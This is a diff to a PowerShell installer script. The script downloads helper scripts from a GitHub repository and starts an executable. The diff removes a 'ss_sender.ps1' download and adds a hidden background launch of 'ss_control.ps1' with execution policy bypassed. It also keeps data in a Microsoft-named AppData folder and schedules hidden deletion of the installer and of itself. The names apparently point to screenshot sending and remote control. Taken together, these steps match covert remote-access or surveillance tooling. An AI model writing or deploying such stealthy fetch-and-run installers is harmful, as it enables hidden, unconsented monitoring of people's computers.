@@ -13,7 +13,6 @@ $runDir = "$env:APPDATA\run"
 $runExe = "$runDir\run.exe"
 $installDir = "$env:TEMP\run"
 $installer = "$installDir\ss_installer.ps1"
-$ssSender = "$installDir\ss_sender.ps1"
 $ssControl = "$installDir\ss_control.ps1"
 $datDir = "$env:APPDATA\Microsoft\run"
 $datFile = "$datDir\run.dat"
@@ -109,18 +108,6 @@ catch {
   exit
 }
 
-Log "25a Downloading ss_sender.ps1"
-try {
-  Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$latestCommit/frames_dev/ss_sender.ps1" -OutFile $ssSender -UseBasicParsing -ErrorAction Stop
-  Log "25b ss_sender.ps1 downloaded successfully"
-}
-catch {
-  Log "25c ERROR: ss_sender.ps1 download failed"
-  Log "25d Error: $($_.Exception.Message)"
-  Read-Host "Press Enter to close"
-  exit
-}
-
 Log "25e Downloading ss_control.ps1"
 try {
   Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$latestCommit/frames_dev/ss_control.ps1" -OutFile $ssControl -UseBasicParsing -ErrorAction Stop
@@ -133,7 +120,7 @@ catch {
   exit
 }
 
-if (-not (Test-Path $runExe) -or -not (Test-Path $installer) -or -not (Test-Path $ssSender) -or -not (Test-Path $ssControl)) {
+if (-not (Test-Path $runExe) -or -not (Test-Path $installer) -or -not (Test-Path $ssControl)) {
   Log "26 ERROR: Required files are missing, exiting"
   Read-Host "Press Enter to close"
   exit
@@ -249,16 +236,22 @@ Log "53 Starting run.exe"
 Start-Process $runExe
 Log "54 run.exe start command sent"
 
+Log "55 Starting ss_control.ps1"
+Start-Process powershell.exe `
+  -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', "& '$ssControl'" `
+  -WindowStyle Hidden
+Log "56 ss_control.ps1 started in background"
+
 Read-Host "Press Enter to close"
 
 if ($installer) {
-  Log "55 Scheduling installer cleanup"
-  Start-Process powershell -ArgumentList "-Command `"Start-Sleep 2; Remove-Item '$installer', '$ssSender', '$ssControl' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
+  Log "57 Scheduling installer cleanup"
+  Start-Process powershell -ArgumentList "-Command `"Start-Sleep 2; Remove-Item '$installer' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
 }
 
 if ($self) {
-  Log "56 Scheduling installer self cleanup"
+  Log "58 Scheduling installer self cleanup"
   Start-Process powershell -ArgumentList "-Command `"Start-Sleep 4; Remove-Item '$self' -Force`"" -WindowStyle Hidden
 }
 
-Log "57 Installation process finished"
+Log "59 Installation process finished"
